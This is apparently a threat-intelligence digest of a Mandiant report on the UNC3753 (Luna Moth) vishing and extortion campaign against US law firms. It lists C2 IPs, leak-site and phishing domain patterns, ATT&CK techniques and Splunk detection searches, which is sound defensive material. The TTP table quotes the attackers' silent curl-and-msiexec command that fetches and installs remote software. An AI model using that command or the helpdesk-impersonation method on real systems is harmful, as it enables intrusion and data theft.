---
scraped_at: 2026-06-07T00:00:00Z
source_url: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
report_type: threat-intel
severity: high
title: "Google Mandiant: UNC3753 (Luna Moth) 'Seeking Counsel' — Vishing, RMM Abuse, and Physical Intrusion Against US Law Firms"
---

# Google Mandiant: UNC3753 (Luna Moth) "Seeking Counsel" — Vishing, RMM Abuse, and Physical Intrusion Against US Law Firms

On June 5, 2026, Google Cloud / Mandiant published "Seeking Counsel," a comprehensive threat intelligence report documenting a financially motivated data-theft extortion campaign by UNC3753 (also tracked as Luna Moth, Chatty Spider, and Silent Ransom Group) against U.S. law firms from January through May 2026. This report substantially expands on the FBI Flash (FLASH-20260526-01) covered in an earlier threat intel entry and introduces previously unreported network IOCs, phishing infrastructure patterns, and a data leak site.

## 1. IOCs

### IPv4 Addresses (UNC3753 Campaign Infrastructure)

| Indicator | Context |
|-----------|---------|
| 192.236.147.131 | UNC3753 operator-controlled C2 infrastructure; observed during active intrusion phases (January–May 2026 campaign) |
| 192.236.147.138 | UNC3753 operator-controlled C2 infrastructure |
| 193.141.60.212 | UNC3753 operator-controlled C2 infrastructure |
| 192.236.154.158 | UNC3753 operator-controlled C2 infrastructure |
| 192.236.146.173 | UNC3753 operator-controlled C2 infrastructure |
| 174.169.162.62 | UNC3753 operator-controlled C2 infrastructure |
| 64.94.84.97 | UNC3753 operator-controlled C2 infrastructure |

### Domains

| Indicator | Context |
|-----------|---------|
| business-data-leaks[.]com | UNC3753 LEAKEDDATA — primary data leak site (DLS) where stolen victim data is published; used for extortion leverage |
| `<org>-itdesk[.]com` | Phishing infrastructure pattern — organization name + "-itdesk" registered to impersonate internal IT helpdesks; used for vishing call spoofing and callback-phishing lure URLs |
| `<org>-it[.]com` | Phishing infrastructure pattern — organization name + "-it" domain for IT helpdesk impersonation |
| `<org>-helpdesk[.]com` | Phishing infrastructure pattern — organization name + "-helpdesk" domain for IT support impersonation |
| privnote[.]com | Legitimate service (abused) — used to transmit self-destructing installation links and commands to victims; messages expire immediately after viewing, defeating forensic recovery |

### Hashes / File Artifacts

No file-based malware hashes — UNC3753 operates exclusively with legitimate remote administration and cloud-sync tools, leaving no traditional malware artifacts.

## 2. TTPs (MITRE ATT&CK)

| Tactic | Technique ID | Technique Name | Usage |
|--------|-------------|----------------|-------|
| Initial Access | T1566.004 | Phishing: Spearphishing Voice | Actors call targets directly or pose as IT helpdesk; use invoice/billing pretexts to initiate screen-sharing sessions |
| Initial Access | T1133 | External Remote Services | Abuse of Teams, Zoom, and Quick Assist for initial remote access under IT impersonation pretext |
| Execution | T1204.002 | User Execution: Malicious File | Victim instructed to install RMM tool (Bomgar, Zoho Assist, SuperOps) presented as legitimate IT software; SuperOps delivered via `curl -sL <URL> -o SuperOps.msi && msiexec /i SuperOps.msi /quiet` |
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | PowerShell used post-access for discovery and data staging |
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | CMD used post-access for file enumeration and staging |
| Persistence | T1053.005 | Scheduled Task/Job: Scheduled Task | Scheduled tasks created to maintain RMM agent persistence |
| Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Registry run keys used to persist RMM agents across reboots |
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Name or Location | All tools used are legitimate (AnyDesk, Bomgar, Zoho, SuperOps) — no traditional malware present |
| Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | In some cases, security tools disabled after RMM access was established |
| Defense Evasion | T1070.001 | Indicator Removal: Clear Windows Event Logs | Windows event logs cleared before attacker exit |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | LSASS credential dumping observed in some intrusions to enable lateral movement to additional systems |
| Credential Access | T1003.002 | OS Credential Dumping: Security Account Manager | SAM database dumping observed |
| Discovery | T1083 | File and Directory Discovery | File enumeration targeting legal documents, client files, tax records (W-2/W-9/1099), PII, SSNs, audit files |
| Discovery | T1135 | Network Share Discovery | Mapped network drives and iManage document repositories enumerated |
| Discovery | T1046 | Network Service Discovery | Internal network service enumeration for lateral movement |
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | RDP used for lateral movement to additional systems post-credential theft |
| Lateral Movement | T1021.004 | Remote Services: SSH | SSH used for lateral movement in environments with Linux/macOS endpoints |
| Collection | T1005 | Data from Local System | Legal documents, PII, tax records, SSNs, client agreements, audit files staged locally |
| Collection | T1213 | Data from Information Repositories | iManage document management system accessed and enumerated |
| Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Data drag-and-dropped into threat actor–controlled consumer Google Drive accounts during screen-sharing sessions |
| Exfiltration | T1048.002 | Exfiltration Over Alternative Protocol | WinSCP (portable) used for SFTP/SCP exfiltration; Rclone used for cloud-sync bulk exfiltration |
| Exfiltration | T1052.001 | Exfiltration Over Physical Medium | Physical access fallback: operatives pose as IT technicians at victim offices and insert USB storage to extract data |
| Command and Control | T1572 | Protocol Tunneling | RDP and SSH over established RMM sessions used to proxy additional access |
| Impact | T1657 | Financial Theft (Extortion) | Extortion email sent within 30 minutes of environment exit; 3-day deadline; threatens publication on business-data-leaks[.]com, direct contact with employees/clients, and regulatory exposure |

**Attack Speed:** The full sequence — initial contact to data exfiltration and extortion email — is completed within a single business day. Data identification, staging, and theft typically occur in under one hour once remote access is established.

## 3. Malware & Tools

| Tool | Type | Role |
|------|------|------|
| AnyDesk | Legitimate RMM (abused) | Primary remote access tool installed via social engineering; persisted via registry or scheduled task |
| Bomgar (BeyondTrust Remote Support) | Legitimate RMM (abused) | Alternative enterprise RMM installed in some intrusions |
| Zoho Assist | Legitimate RMM (abused) | Cloud-based remote support tool installed under IT impersonation pretext |
| SuperOps RMM | Legitimate RMM (abused) | MSP platform installed silently via curl + msiexec command chain |
| Quick Assist | Built-in Windows tool (abused) | Used for initial interactive access before installing persistent RMM |
| Microsoft Teams / Zoom | Legitimate collaboration (abused) | Screen-sharing sessions used to observe victim environment and guide RMM installation |
| WinSCP (portable) | Legitimate SFTP client (abused) | Portable (no-install) version used for SFTP/SCP exfiltration to attacker-controlled servers |
| Rclone | Legitimate cloud-sync (abused) | Used for bulk cloud storage exfiltration; sometimes renamed to evade detection |
| Privnote | Legitimate ephemeral messaging (abused) | Self-destructing messages deliver installation links and commands; no forensic artifact after reading |

## 4. Threat Actor / Campaign Attribution

| Attribute | Detail |
|-----------|--------|
| Actor | UNC3753 (Mandiant/Google GTIG) |
| Aliases | Luna Moth, Chatty Spider, Silent Ransom Group (SRG) |
| Active Since | March 2022 (as UNC2686 with BazarCall/callback-phishing; UNC3753 identity from 2023) |
| Motivation | Financially motivated — data theft and extortion; no ransomware encryption |
| Primary Targets | U.S. law firms (primary, 2026); historically healthcare, financial services |
| Scale (2026) | 100+ confirmed intrusions Jan–May 2026; 38+ law firms' data published on DLS |
| Data Leak Site | business-data-leaks[.]com (LEAKEDDATA) |
| Extortion Deadline | 3 days from initial contact |
| FBI Flash | FLASH-20260526-01 (TLP:CLEAR); published May 26, 2026 |
| Prior Reporting | FBI Flash covered in existing threat-intel file (2026-06-01_bleepingcomputer-com-fbi-silent-ransom-group-law-firm-data-theft.md) |

**What's new in this report vs. existing FBI Flash coverage:**
- 7 specific C2 IP addresses confirmed by Mandiant investigation
- Data leak site domain (business-data-leaks[.]com) explicitly named
- Phishing domain registration patterns (`<org>-itdesk[.]com` etc.)
- SuperOps RMM delivery chain (curl + msiexec) documented
- Teams/Zoom/Quick Assist initial access vectors added
- iManage repository targeting documented
- LEAKEDDATA DLS branding confirmed

## 5. Splunk Detection Searches

```spl
| comment "UNC3753 RMM installation outside IT provisioning parents — social engineering install indicator"
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
  from datamodel=Endpoint.Processes
  where Processes.process_name IN
    ("AnyDesk.exe", "BeyondTrustSupport.exe", "bomgar-scc.exe", "ZohoAssist.exe",
     "ZohoMeeting.exe", "SuperOps.exe", "SuperOpsRMM.exe", "winagent.exe")
    AND NOT Processes.parent_process_name IN
      ("msiexec.exe", "services.exe", "svchost.exe", "TrustedInstaller.exe",
       "MsiExec.exe", "setup.exe")
  by Processes.dest Processes.user Processes.parent_process_name Processes.process_name
     Processes.process Processes.process_id
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=case(
    parent_process_name IN ("explorer.exe", "cmd.exe", "powershell.exe", "curl.exe"), 88,
    parent_process_name IN ("chrome.exe", "msedge.exe", "firefox.exe"), 80,
    1=1, 70)
| where risk_score >= 70
| table firstTime lastTime dest user parent_process_name process_name process process_id risk_score
```

```spl
| comment "UNC3753 SuperOps silent install via curl — specific delivery chain fingerprint"
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
  from datamodel=Endpoint.Processes
  where (Processes.process_name="curl.exe" AND Processes.process="*SuperOps*")
    OR (Processes.process_name="msiexec.exe" AND Processes.process="*SuperOps*")
  by Processes.dest Processes.user Processes.parent_process_name Processes.process_name
     Processes.process Processes.process_id
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=95
| table firstTime lastTime dest user parent_process_name process_name process process_id risk_score
```

```spl
| comment "UNC3753 DNS lookup for known IOC domains and phishing patterns"
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
  from datamodel=Network_Resolution.DNS
  where DNS.query IN ("business-data-leaks.com", "*.business-data-leaks.com")
    OR (DNS.query="*privnote.com")
  by DNS.src DNS.query DNS.answer
| `drop_dm_object_name(DNS)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=case(
    match(query,"business-data-leaks"), 95,
    1=1, 60)
| where risk_score >= 60
| table firstTime lastTime src query answer risk_score
```

```spl
| comment "UNC3753 network connections to known C2 IPs"
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
  from datamodel=Network_Traffic.All_Traffic
  where All_Traffic.dest IN
    ("192.236.147.131", "192.236.147.138", "193.141.60.212",
     "192.236.154.158", "192.236.146.173", "174.169.162.62", "64.94.84.97")
  by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.bytes_out
| `drop_dm_object_name(All_Traffic)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=95
| table firstTime lastTime src dest dest_port bytes_out risk_score
```

## 6. Executive Summary

Google Cloud / Mandiant published "Seeking Counsel" on June 5, 2026, providing the most detailed public reporting to date on UNC3753 (Luna Moth / Silent Ransom Group), a financially motivated threat actor that has conducted over 100 confirmed intrusions against U.S. law firms from January through May 2026.

UNC3753's distinguishing characteristic is a complete absence of traditional malware — the group operates exclusively with legitimate remote administration and cloud-sync tools, making signature-based detection ineffective. The attack lifecycle unfolds entirely within a single business day: a vishing call impersonating an IT helpdesk convinces an employee to install a commercial RMM agent (AnyDesk, Bomgar, Zoho Assist, or SuperOps) via screen-sharing, after which the actor spends under one hour identifying, staging, and exfiltrating target data (legal agreements, PII, SSNs, iManage documents) before sending an extortion demand within 30 minutes of exit.

This Mandiant report is the first public source to name specific C2 IP addresses (192.236.147.x range, 193.141.60.212, and others), the data leak site (`business-data-leaks[.]com`), and the phishing domain pattern `<org>-itdesk[.]com` / `<org>-it[.]com` / `<org>-helpdesk[.]com`. Defenders should immediately block the named C2 IPs, alert on DNS queries for the DLS domain, and investigate any RMM tools installed outside normal provisioning workflows.

The group has also introduced physical intrusion as a fallback: when remote access attempts are blocked, operatives physically attend target offices posing as IT staff and insert USB storage devices to directly exfiltrate data — a technique with no precedent in data-extortion operations.

## References

- [Google Cloud / Mandiant — Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (2026-06-05)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms)
- [BleepingComputer — FBI warns of Silent Ransom Group in-person data theft attacks (2026-05-27)](https://www.bleepingcomputer.com/news/security/fbi-warns-of-silent-ransom-group-in-person-data-theft-attacks/)
- [FBI Flash FLASH-20260526-01 (TLP:CLEAR) — Silent Ransom Group](https://www.ic3.gov/CSA/2026/260526.pdf)
- [MITRE ATT&CK — T1566.004: Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004/)
- [MITRE ATT&CK — T1219: Remote Access Software](https://attack.mitre.org/techniques/T1219/)
- [MITRE ATT&CK — T1567.002: Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/)
- [Unit 42 — Luna Moth Callback Phishing Campaign](https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/)
